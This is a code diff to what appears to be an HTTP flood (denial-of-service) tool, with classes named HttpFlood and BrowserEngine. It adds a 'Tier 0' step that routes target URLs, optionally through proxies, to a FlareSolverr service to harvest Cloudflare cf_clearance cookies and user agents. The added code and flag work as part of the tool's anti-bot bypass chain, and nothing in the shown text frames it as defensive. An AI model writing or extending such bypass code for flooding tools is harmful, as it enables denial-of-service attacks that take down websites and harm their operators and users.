@@ -731,6 +731,7 @@ class EngineState:
     def __init__(self):
         self.active_threads_target = RawValue("i", 0)
         self.max_threads = 0
+        self.flaresolverr_url: str | None = None
 
 ENGINE_STATE = EngineState()
 
@@ -2037,6 +2038,39 @@ class BrowserEngine:
         
         logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Starting Waterfall Bypass System for {url}...{bcolors.RESET}")
         
+        # Tier 0: External FlareSolverr API
+        if getattr(ENGINE_STATE, "flaresolverr_url", None):
+            logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 0 (FlareSolverr API) at {ENGINE_STATE.flaresolverr_url}...{bcolors.RESET}")
+            try:
+                import urllib.request
+                import json
+                payload_data = {
+                    "cmd": "request.get",
+                    "url": url,
+                    "maxTimeout": 15000
+                }
+                if proxy:
+                    payload_data["proxy"] = {"url": f"http://{proxy}" if "://" not in proxy else proxy}
+                payload = json.dumps(payload_data).encode("utf-8")
+                req = urllib.request.Request(
+                    ENGINE_STATE.flaresolverr_url,
+                    data=payload,
+                    headers={"Content-Type": "application/json"}
+                )
+                with urllib.request.urlopen(req, timeout=18) as resp:
+                    resp_data = json.loads(resp.read().decode("utf-8"))
+                    if resp_data.get("status") == "ok" and resp_data.get("solution"):
+                        sol = resp_data["solution"]
+                        cookies = sol.get("cookies", [])
+                        ua = sol.get("userAgent", user_agent)
+                        cf_cookie = next((f"{c['name']}={c['value']}" for c in cookies if c.get("name") == "cf_clearance"), None)
+                        if cf_cookie:
+                            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0!{bcolors.RESET}")
+                            HttpFlood._active_solver = "Tier 0 (FlareSolverr)"
+                            return cf_cookie, ua
+            except Exception as e:
+                logger.debug(f"[!] Tier 0 FlareSolverr failed: {e}. Falling back to Tier 1.")
+
         # Tier 1: Lightweight HTTP
         logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 1 (Lightweight)...{bcolors.RESET}")
         cookie, ua = BrowserEngine._solve_tier1_lightweight(url, proxy, user_agent, 10)
@@ -5463,6 +5497,8 @@ async def main_async():
                     HttpFlood._cfbuam_expiry = time() + 900 # Valid for 15 mins
                 elif arg == "--shared-ua":
                     HttpFlood._cfbuam_ua = next(args_iter, None)
+                elif arg == "--flaresolverr":
+                    ENGINE_STATE.flaresolverr_url = next(args_iter, "http://localhost:8191/v1")
 
             # Auto-load from Intelligence DB if not provided
             if not HttpFlood._cfbuam_cookie:
